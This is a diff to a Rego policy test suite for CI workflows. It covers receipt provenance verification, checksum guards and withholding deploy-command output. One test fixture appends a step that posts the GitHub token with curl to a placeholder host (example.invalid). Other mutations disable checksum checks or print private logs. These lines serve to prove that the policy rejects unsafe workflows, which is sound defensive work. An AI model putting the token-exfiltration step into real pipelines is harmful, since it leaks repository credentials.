@@ -598,6 +598,40 @@ test_rejects_native_receipt_provenance_with_changed_verifier_step if {
 	contains(msg, "must not use pull_request_target")
 }
 
+test_rejects_native_receipt_provenance_with_changed_verification_base if {
+	base := native_receipt_provenance_fixture
+	steps := [
+		base.jobs.verify.steps[0],
+		object.union(base.jobs.verify.steps[1], {"run": replace(base.jobs.verify.steps[1].run,
+			`verification_base_sha="$base_sha"`, `verification_base_sha="untrusted"`)}),
+	]
+	workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+	violations := deny with input as workflow
+
+	some msg in violations
+	contains(msg, "must not use pull_request_target")
+}
+
+test_rejects_native_receipt_provenance_without_merged_event_identity_or_premerge_base if {
+	base := native_receipt_provenance_fixture
+	approved_run := base.jobs.verify.steps[1].run
+	every unsafe_run in [
+		replace(approved_run, `verification_base_sha="$(python3 -I scripts/ci/harbor-native-chainguard-receipt-import.py event-base \
+    --event-file "$GITHUB_EVENT_PATH" --base-sha "$base_sha" --token-file "$token_file")"`, `verification_base_sha="$(jq -er '.pull_request.base.sha' "$GITHUB_EVENT_PATH")"`),
+		replace(approved_run, "--base-sha \"$verification_base_sha\" --head-sha \"$head_sha\"", "--base-sha \"$base_sha\" --head-sha \"$head_sha\""),
+	] {
+		unsafe_run != approved_run
+		steps := [
+			base.jobs.verify.steps[0],
+			object.union(base.jobs.verify.steps[1], {"run": unsafe_run}),
+		]
+		workflow := object.union(base, {"jobs": {"verify": object.union(base.jobs.verify, {"steps": steps})}})
+		violations := deny with input as workflow
+		some msg in violations
+		contains(msg, "must not use pull_request_target")
+	}
+}
+
 test_rejects_native_receipt_provenance_with_extra_step if {
 	base := native_receipt_provenance_fixture
 	steps := array.concat(base.jobs.verify.steps, [{"run": "curl --data '${{ github.token }}' https://example.invalid"}])
@@ -931,20 +965,8 @@ test_rejects_modified_azuread_plan_stage_classifier if {
 	}
 }
 
-test_allows_exact_apply_stage_classifier if {
-	violations := deny with input as workflow_with_live_run(classified_apply_run)
-	count(violations) == 0
-}
-
 test_rejects_unverified_plan_stage_classifier if {
 	run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n", [plan_stage_call]))
-	violations := deny with input as workflow_with_live_run(run)
-	some msg in violations
-	contains(msg, "withhold sensitive command output")
-}
-
-test_rejects_unverified_apply_stage_classifier if {
-	run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n", [apply_stage_call]))
 	violations := deny with input as workflow_with_live_run(run)
 	some msg in violations
 	contains(msg, "withhold sensitive command output")
@@ -991,54 +1013,19 @@ test_rejects_modified_plan_stage_classifier if {
 	}
 }
 
-test_rejects_classified_apply_success_exit if {
-	run := replace(classified_apply_run, "exit 1", "exit 0")
-	violations := deny with input as workflow_with_live_run(run)
-	some msg in violations
-	contains(msg, "withhold sensitive command output")
-}
-
-test_rejects_modified_apply_stage_guard if {
-	every replacement in [
-		replace(apply_stage_guard, "f3297b3c508c7fd919357877f5cf39210ddc0f075354af8ba6c935637b301829", "0000000000000000000000000000000000000000000000000000000000000000"),
-		replace(apply_stage_guard, "sha256sum --check --status", "true"),
-		replace(apply_stage_guard, "sha256sum", "shasum"),
-		replace(apply_stage_guard, "if sha256sum", "if ! sha256sum"),
-		replace(apply_stage_guard, " --check", ""),
-		replace(apply_stage_guard, " --status", ""),
-		replace(apply_stage_guard, "stage.sh", "other.sh"),
-		replace(apply_stage_guard, " 2>/dev/null", ""),
-		replace(apply_stage_guard, "; then", " || true; then"),
-		sprintf("%s\n  echo extra", [apply_stage_guard]),
-	] {
-		run := replace(classified_apply_run, apply_stage_guard, replacement)
-		violations := deny with input as workflow_with_live_run(run)
-		some msg in violations
-		contains(msg, "withhold sensitive command output")
-	}
-}
-
-test_rejects_modified_apply_stage_classifier if {
-	every replacement in [
-		`bash scripts/ci/terragrunt-apply-stage.sh <"$private_log"`,
-		`bash scripts/ci/terragrunt-apply-stage.sh <"$private_log" || cat "$private_log"`,
-		`bash scripts/ci/terragrunt-apply-stage.sh <"$private_log" || exit 0`,
-		`sh scripts/ci/terragrunt-apply-stage.sh <"$private_log"`,
-		`bash scripts/ci/other.sh <"$private_log"`,
-		`bash ./scripts/ci/terragrunt-apply-stage.sh <"$private_log"`,
-		`bash scripts/ci/terragrunt-apply-stage.sh --verbose <"$private_log"`,
-		`bash scripts/ci/terragrunt-apply-stage.sh "$private_log"`,
-		`bash scripts/ci/terragrunt-apply-stage.sh <"$other_log"`,
-		`bash scripts/ci/terragrunt-apply-stage.sh <"$private_log"; cat "$private_log"`,
-		`cat "$private_log"`,
-		`echo "$private_log details withheld"`,
-		`echo "$line details withheld"`,
-		sprintf("%s\n  echo extra", [apply_stage_call]),
-	] {
-		run := replace(classified_apply_run, apply_stage_call, replacement)
-		violations := deny with input as workflow_with_live_run(run)
-		some msg in violations
-		contains(msg, "withhold sensitive command output")
+test_quiet_deploy_commands_must_withhold_both_streams_and_propagate_failure if {
+	count(quiet_deploy_runs) == 3
+	every run in quiet_deploy_runs {
+		private_live_output(run)
+		every unsafe in [
+			replace(run, " >/dev/null", ""),
+			replace(run, " 2>&1", ""),
+			sprintf("%s || true", [run]),
+		] {
+			violations := deny with input as workflow_with_live_run(unsafe)
+			some msg in violations
+			contains(msg, "withhold sensitive command output")
+		}
 	}
 }
 
@@ -1056,7 +1043,7 @@ test_rejects_modified_harbor_mirror_status if {
 		replace(harbor_mirror_private_run, `trap 'rm -f "$private_log" "$public_status"' EXIT`, `trap 'rm -f "$private_log"' EXIT`),
 		replace(harbor_mirror_private_run, "sha256sum --check --status", "true"),
 		replace(harbor_mirror_private_run, "&& sha256sum", "|| sha256sum"),
-		replace(harbor_mirror_private_run, "acd364eeca57af100f9ef135644a1c906c07a54e0bb9261c2cf012b3ac402bd4", "0000000000000000000000000000000000000000000000000000000000000000"),
+		replace(harbor_mirror_private_run, "e9bf15954f1fcf2a99c2a9291aa4ab1a3f1a66d0accb812f831572adee0ca423", "0000000000000000000000000000000000000000000000000000000000000000"),
 		replace(harbor_mirror_private_run, "scripts/ci/harbor-publish.sh'", "scripts/ci/other.sh'"),
 		replace(harbor_mirror_private_run, "harbor-publish.sh mirror", "harbor-publish.sh publish"),
 		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-dns", "harbor-publish.sh mirror-other"),
@@ -1064,6 +1051,7 @@ test_rejects_modified_harbor_mirror_status if {
 		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-prometheus", "harbor-publish.sh mirror-other"),
 		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-uptime-kuma", "harbor-publish.sh mirror-other"),
 		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-adguard", "harbor-publish.sh mirror-other"),
+		replace(harbor_mirror_private_run, "harbor-publish.sh mirror-cilium", "harbor-publish.sh mirror-other"),
 		replace(harbor_mirror_private_run, `>"$private_log" 2>&1`, ""),
 		replace(harbor_mirror_private_run, "umask 077", "umask 022"),
 		sprintf("%s\necho extra", [harbor_mirror_private_run]),
@@ -1207,12 +1195,6 @@ fi
 echo "success details withheld"`
 
 classified_azuread_live_run := replace(azuread_private_live_run, "\nthen\n", sprintf("\nthen\n  %s\n    %s\n  fi\n", [azuread_plan_stage_guard, azuread_plan_stage_call]))
-
-apply_stage_call := `bash scripts/ci/terragrunt-apply-stage.sh <"$private_log" || true`
-
-apply_stage_guard := `if sha256sum --check --status <<<'f3297b3c508c7fd919357877f5cf39210ddc0f075354af8ba6c935637b301829  scripts/ci/terragrunt-apply-stage.sh' 2>/dev/null; then`
-
-classified_apply_run := replace(withheld_live_run, "\nthen\n", sprintf("\nthen\n  %s\n    %s\n  fi\n", [apply_stage_guard, apply_stage_call]))
 
 withheld_catalog_run := `private_log="$(mktemp)"
 trap 'rm -f "$private_log"' EXIT
